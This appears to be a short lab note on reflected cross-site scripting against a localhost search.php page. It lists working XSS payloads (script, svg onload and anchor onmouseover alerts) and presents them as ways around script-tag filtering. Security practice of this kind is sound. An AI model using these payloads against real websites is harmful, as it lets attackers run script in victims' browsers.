
## Reflected XSS 
Target: search.php

Steps:
It can be done from the search field or from URL:

- Via search field:
insert the following into the field : <script>alert("ok")</script>

- Via search URL
append the URL following just after (search.php) : ?name=<script>alert("ok")</script>

Full URL should be like : http://localhost/sites/xss/example1/search.php?name=<script>alert("ok")</script>


Assume the <script> was blocked, it is possible to bypass it using anyone of these : 

add one of these as name:

<script>alert("ok")</script>

<svg onload=alert(1)>

<a onmouseover="alert(1)" href="#">read this!</a>

Then, view it from search.php page


